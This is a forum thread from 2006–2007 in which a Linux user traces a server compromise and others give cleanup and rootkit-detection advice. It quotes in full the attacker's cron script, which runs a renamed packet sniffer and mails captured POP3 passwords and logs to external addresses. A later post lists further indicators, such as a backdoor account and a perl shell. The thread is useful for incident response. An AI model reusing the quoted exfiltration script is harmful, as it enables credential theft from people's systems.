---
title: "I *HAVE* been hacked..."
date: 2006-07-24
forum: Absolute Beginner Talk
---

### Post by Kon on 2006-07-24
I have noticed that whenever my system reboots, a mail message is sent to two yahoo accounts (stormuletzz@yahoo.ca and [email]thelinuxpinguin@yahoo.com[/email]).

The message contains data from accesses to and from port 110 (POP3).

ie. the lucky recipient now has all my email POP servers, user names and passwords.

I've tracked the scanner to **/usr/lib/named/klogd1**.
A few other files in /usr/lib/named are also used, including a perl script called "zum".

What I want to know is: 
How can I find out what launches /usr/lib/named/klogd1?
A search of /etc/init*/* doesn't reveal anything...

How can I find what posts the captured file to the email addresses listed?

In my **/var/log/messages** I get:
Jul 24 07:36:05 localhost kernel: [5383359.386000] device eth1 entered promiscuous mode

In **/var/log/syslog** I get entries like:
Jul 11 17:21:16 localhost kernel: [4295104.863000] klogd1 uses obsolete (PF_INET,SOCK_PACKET)

---

### Post by T700 on 2006-07-24
From the information you posted, it would appear you have indeed been compromised.  At this point, I'd not worry over much about the why and how.  I'd suggest you:

1.  Backup all your data.

2.  Do a full format and reinstall.

3.  Carefully examine your computing practices to see how this happened.  (Do you keep updated on patches?  Run a firewall or use a NAT enabled router?  Install software from unknown sources?)

Good luck and please keep the forum posted on what happens.

Paul

---

### Post by johnnymac on 2006-07-24
Yup - you got hacked - at this point you really don't have many options.  So if I were you I'd:

1.  Wack the system and start again
2.  New install - install a rootkit hunter
3.  New install - install an anti-virus
4.  Use a firewall (router or software).

Good luck - j

---

### Post by geco on 2006-07-24
if you can demonstrate that you have been, why don't call the police?

---

### Post by ComplexNumber on 2006-07-24
**Kon**
do not put rootkit hunter on your harddrive - place it on a floppy and run it from there. that way, it prevents rootkit hunter from being altered so that it masks the malware.

---

### Post by Lord Illidan on 2006-07-24
Did you download something prior to the attack? Something which could have been malicious?

---

### Post by it.henrik on 2006-07-24
How did you notice that the emails were sent? What was it that made you realize that something fishy was going on?

---

### Post by Kon on 2006-07-24
The ubuntu machine sits behind a windoze shared connection.
I suspect the hack made it via an SSH forwarder to the ubuntu machine - but I can't tell, as my **/var/log/secure** has been compromised.

At present, I strongly suspect that **/usr/bin/ssh** has been compromised - I can not replace it nor the version in X11/bin.

I am in the process of collecting all my updates (changes from base) - I use the machine as my fax / voice / mail / printer server - and have installed *getmail*, *dovecot*, *vgetty*, etc, so that I can reinstall them after a fresh install (I'm downloading xubuntu ISO now).

I noticed the mail because I routinely monitor */var/log/mail.info* - my partner maintains a large mailing list as secretary for an academic organization.

I would still like to find out what is invoking klogd1

What does a rootkit hunter do?

---

### Post by MrHorus on 2006-07-24
> **Kon said:**
> I noticed the mail because I routinely monitor */var/log/mail.info* - my partner maintains a large mailing list as secretary for an academic organization.

Good for you mate, keep us informed with the results of your investigations.

I was compromised a few years ago myself by some Romanian kid - ended up with a rootkit, and ircd and a few eggdrop bots. 

I managed to trace him via the eggdrops he set up but of course, not a lot you can do really bar wiping the box and starting anew.

---

### Post by AndrewShugg on 2006-07-24
A rootkit hunter will look at all the programs on your hard disk to see if any of them look like they aren't the real thing any more, i.e. a "rootkit" has been installed with nasty binaries replacing the proper programs.

My sympathies.  Better luck next time.

At the risk of echoing everyone else:

* disconnect the ethernet cable
* reboot off a CD - Knoppix, Ubuntu live CD, whatever
* get all your data off
* reinstall

If you can afford it, the quickest method would be to buy a new hard drive, pull the old one, put the new one in, and install a fresh server on it. Include a package like 'integrit' or 'aide' in your installation that keeps track of changes to files on the system.  Then you can have your old hard disk as a second drive, mount it with options ro,nosuid,noexec (read-only, no set-uid capabilities, no files are executable) and get back stuff like your emails etc.

Andrew S.

---

### Post by Thund3rstruck on 2006-07-24
This is very interesting. I wonder now what I should be checking to identify this sort of thing. I'm curious if someone has produced a checklist of sorts to validate the integrity of systems and/or identify if a system has been compromised?

---

### Post by moma on 2006-07-24
Rootkit-hunters you can trust:

[http://www.rootkit.nl/]("http://www.rootkit.nl/")

[http://www.chkrootkit.org/]("http://www.chkrootkit.org/")

Run one of them regularly if you have a server installation.

// moma
   [http://www.futuredesktop.net/ubuntu6.06.html]("http://www.futuredesktop.net/ubuntu6.06.html")

---

### Post by Kurt` on 2006-07-24
It's important to note, any scan run when booted off the compromised system might as well not even be run at all.

Do what ComplexNumber said. :)

---

### Post by kigina on 2006-07-24
um...

How often does stuff like this happen?

and

Would the script have to be written for ubuntu specifically?

---

### Post by teet on 2006-07-24
It happens...

I worked part time at a computer shop this summer.  They use squirrelmail (and I assume postfix?) to do their email stuff.  I think they use some version of Fedora Core as the base system.  Anywho, the "server guru" at the shop tried to log on to check his email from his house but he couldn't.  When he got to the shop the next day he found out that the mail server had been turned into a spambot of sorts and was routing thousands of spam messages from Taiwan to Taiwan.

Nothing is 100% secure.

-teet

---

### Post by The Noble on 2006-07-24
Wow, this is the first time I have seen someone on a linux machine hacked. When I saw the title of this thread, I thought someone could come along and fix whatever problem. It is a real shame this happened, and good luck on fixing it. Also, do you have any ideas on how this happened?

---

### Post by Frank Golden on 2006-07-24
> **The Noble said:**
> Wow, this is the first time I have seen someone on a linux machine hacked. When I saw the title of this thread, I thought someone could come along and fix whatever problem. It is a real shame this happened, and good luck on fixing it. Also, do you have any ideas on how this happened?Nothing is immune. With the growing use of linux
you will see more attacks. There are really nasty people out
there, there always has been.

---

### Post by Kon on 2006-07-24
> **The Noble said:**
> Wow, this is the first time I have seen someone on a linux machine hacked. When I saw the title of this thread, I thought someone could come along and fix whatever problem. It is a real shame this happened, and good luck on fixing it. Also, do you have any ideas on how this happened?

Well, I can't really tell anymore, since the original logs don't reflect anything (at least I haven't found anything).

All I DO suspect is that:
[LIST=1]
[*]a /usr/lib/named/klogd1 is being used to capture network traffic on (at least) port 110
[*]the output is being written to /usr/lib/named/named.sn
[/LIST]

I have verified the following:
[LIST=1]
[*]the contents of named.sn was emailed to two yahoo addresses
[*]Scripts (*clean* and *cleanssh*) in the /usr/lib/named directory maintain a file called /usr/lib/+c0d.init and run klogd1
[*]/usr/bin/ssh and /usr/bin/X11/ssh refer to /usr/lib/+c0d.init
[*]I can not remove these two ssh executables, even after killing all processes referring to ssh*
[/LIST]

I suspect that SSH was used in a script-kiddy attack to brute-force the root password, and that was used to compromise the ssh subsystem - there is no other network traffic - only the POP passwords being mailed at boot.

I still have had no luck in establishing how klogd1 is being executed (what invokes */usr/lib/named/clean?*)

And I still have not been able to determine what process / script / program is used to send the mail... text searches of the binaries are not yielding results (assuming the addresses are not encoded)..

My download of xubuntu's ISO has completed, so I may just reformat and reinstall tomorrow.. seems a waste to reformat, when I've already disabled the original problem... 

BTW: The infected machine is a PentiumII 400Mhz with 384M RAM and a couple of old hard-drives.

HAH!! I've got them!

They used **/etc/cron.daily/dnsquery**:
[I]
#!/bin/sh
cd /usr/lib/
./popauth -r httpd.log >> test
echo "$(uptime)" >> test
rm -rf httpd.log
echo "named.sn"
cat /usr/lib/named/named.sn >> test
rm -rf /usr/lib/named/named.sn
cd /usr/lib/named
./clean
./cleanssh
echo "ssh.log" >> /usr/lib/test
cat ssh.log >> /usr/lib/test
cd /usr/lib/
mail [email]thelinuxpinguin@yahoo.com[/email] -s "$(hostname -f)" < test
mail [email]stormuletzz@yahoo.ca[/email] -s "$(hostname -f)" < test
A=$PATH
killall -9 popauth
export PATH=/usr/lib/
popauth -w httpd.log &
export PATH=$A
[/I]

Ok, so now the cleanup would consist of fixing the probably-damaged ssh subsystem....?

---

### Post by pbaehr on 2006-07-24
Out of curiosity, how strong is your password?

I have my SSH port open so that I can connect to my computer from work. My password is 8 random characters (letters of random case, numbers, and symbols) and I rest soundly knowing that it should be impossible to break by brute force.

However, if your password is decently strong, I may reconsider leaving the port open.

Oh, and do you have the root account active? On mine they'd need to guess my username, too.

---

### Post by RavenOfOdin on 2006-07-24
If you choose to keep a root account (assuming you did a server install) it shouldn't be all that much of a problem as long as you prohibit logins remotely via SSH and make it next to impossible to reliably brute force.

Oh, and change your SSH port from the default if you're going to leave the service open to the intarweb.

---

### Post by Kon on 2006-07-24
BTW: The popauth referred to above seems to be a renamed "dsniff", which sniffs network packets??

---

### Post by Kon on 2006-07-24
Final question:
What could prevent me from deleting */usr/bin/ssh* and */usr/bin/X11/ssh*?

When I try:
 **rm /usr/bin/ssh**
I get:
[I]
rm: remove write-protected regular file `/usr/bin/ssh'? y
rm: cannot remove `/usr/bin/ssh': Operation not permitted
[/I]

---

### Post by tturrisi on 2006-07-24
you're not alone!
[http://forums.whirlpool.net.au/forum-replies-archive.cfm/549727.html](http://forums.whirlpool.net.au/forum-replies-archive.cfm/549727.html)

---

### Post by RavenOfOdin on 2006-07-24
Did you try making sure the IMMUTABLE flag wasn't set on ssh?

Do this:

```

sudo (or su -c, whichever one you use for temp root access) chattr -i /usr/bin/ssh

```

If you're performing this command from within your root account, omit the su/do section.  Then try again.

---

### Post by Kon on 2006-07-24
> **RavenOfOdin said:**
> Did you try making sure the IMMUTABLE flag wasn't set on ssh?

Do this:
chattr -i /usr/bin/ssh



lsattr showed "i" attribute was set, but removing it has no effect, as root, I still can't delete ssh.

---

### Post by RavenOfOdin on 2006-07-24
> **Kon said:**
> lsattr showed "i" attribute was set, but removing it has no effect, as root, I still can't delete ssh.

Try doing "ldd ssh" and post the output of that command.  We can try to see if any libraries which shouldn't be there are interfering with the removal.

---

### Post by Kon on 2006-07-25
> **RavenOfOdin said:**
> Try doing "ldd ssh" and post the output of that command.  We can try to see if any libraries which shouldn't be there are interfering with the removal.

I found the problem, lsattr showed 'a' and 's' attributes also set, once all the secondary attributes were cleared, I could remove ssh.  Reinstalling openssh-client confirmed that ssh had been compromised (massively different file sizes).

FYI:

 ldd /usr/bin/ssh
    linux-gate.so.1 =>  (0xffffe000)
    libresolv.so.2 => /lib/tls/i686/cmov/libresolv.so.2 (0xb7faf000)
    libcrypto.so.0.9.7 => /usr/lib/i686/cmov/libcrypto.so.0.9.7 (0xb7eb2000)
    libutil.so.1 => /lib/tls/i686/cmov/libutil.so.1 (0xb7eae000)
    libz.so.1 => /usr/lib/libz.so.1 (0xb7e9a000)
    libnsl.so.1 => /lib/tls/i686/cmov/libnsl.so.1 (0xb7e84000)
    libcrypt.so.1 => /lib/tls/i686/cmov/libcrypt.so.1 (0xb7e55000)
    libselinux.so.1 => /lib/libselinux.so.1 (0xb7e43000)
    libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7d15000)
    libdl.so.2 => /lib/tls/i686/cmov/libdl.so.2 (0xb7d11000)
    /lib/ld-linux.so.2 (0xb7fd1000)


Last night ran synaptic to upgrade (almost) all packages - although I may still just reinstall xubuntu - I want a lighter install on that machine anyway.

---

### Post by joselin on 2006-07-25
Additionally you can install tiger which is a reporter of possible system security vulnerabilities and reports ways 'root' can be compromised.

Cheers

---

### Post by tonymoyoy on 2007-01-18
it's call Troj/Linsniff-B

[http://www.sophos.com/virusinfo/analyses/trojlinsniffb.html](http://www.sophos.com/virusinfo/analyses/trojlinsniffb.html)

i have it on a redhat machine. :s

---

### Post by tdrusk on 2007-01-18
Threadstarter, what are your computer uses? Is it a server or just a desktop. I am running a laptop, how likely is it that this could happen to me?

---

### Post by jbus on 2007-01-18
A security oriented LiveCD is probably the best tool to have on hand.

Insert is one i can think of, but there are many others [http://www.inside-security.de/insert_en.html](http://www.inside-security.de/insert_en.html)

---

### Post by jbus on 2007-01-18
> **fuzzyhair said:**
> Threadstarter, what are your computer uses? Is it a server or just a desktop. I am running a laptop, how likely is it that this could happen to me?

Not likely with this particular exploit, unless you have configured your system as server. Still, it is  possible to get other exploits by not keeping your system up to date or by running malicious code as root.

---

### Post by tdrusk on 2007-01-18
> **jbus said:**
> Not likely with this particular exploit, unless you have configured your system as server. Still, it is  possible to get other exploits by not keeping your system up to date or by running malicious code as root.
Okay thanks. I always update my system and never let anything that I don't know run on my computer. Most of the stuff I run are .deb files on this site or from the official sites.

---

### Post by fakie_flip on 2007-02-17
> **Kon said:**
> I have noticed that whenever my system reboots, a mail message is sent to two yahoo accounts (stormuletzz@yahoo.ca and [email]thelinuxpinguin@yahoo.com[/email]).

The message contains data from accesses to and from port 110 (POP3).

ie. the lucky recipient now has all my email POP servers, user names and passwords.

I've tracked the scanner to **/usr/lib/named/klogd1**.
A few other files in /usr/lib/named are also used, including a perl script called "zum".

What I want to know is: 
How can I find out what launches /usr/lib/named/klogd1?
A search of /etc/init*/* doesn't reveal anything...

How can I find what posts the captured file to the email addresses listed?

In my **/var/log/messages** I get:
Jul 24 07:36:05 localhost kernel: [5383359.386000] device eth1 entered promiscuous mode

In **/var/log/syslog** I get entries like:
Jul 11 17:21:16 localhost kernel: [4295104.863000] klogd1 uses obsolete (PF_INET,SOCK_PACKET)
 
Why don't you run chkrootkit? What output do you get from it? Have you dont any forensics tests on your computer. You should. Also if the person is running lkl (Linux KeyLogger), then he or she could have all of your passwords that you have typed. Have you checked for that?

---

### Post by kingneutron on 2007-03-08
I just got this same mess on an old Suse install.

See:
[http://www.sophos.com/virusinfo/analyses/trojlinsniffb.html](http://www.sophos.com/virusinfo/analyses/trojlinsniffb.html)

What I found so far:

SSH was definitely compromised; they replaced the binaries! (The old binaries wound up in /etc/rpm directory.)   And sshd_config was replaced with a 0-byte file.

There was a /tmp/mexpl.tgz file that contained exploit code.

/etc/passwd and /etc/group were modified with a new account called "ice".

/etc/cron.daily had a new addition - a file called "dnsquery" that emailed the hacker.
( this was basically similar to the original poster's code - /usr/lib/.popauth was run. )

/root/.ssh/known_hosts was modified with a new entry.

there was a file called /tmp/back which apparently ran perl and executed a shell for the attacker.

/usr/include/gpm2.h was a 0-byte, rwxrwxrwx file.

/usr/lib had the +c0d.init file, as well as a subdirectory with exploit - /usr/lib/named.
klogd1, named.sn, and zum were in there.

Looks like we're going to have to rebuild the box, this 455h01e cracker had root for i-dont-know how long. :( :(

---

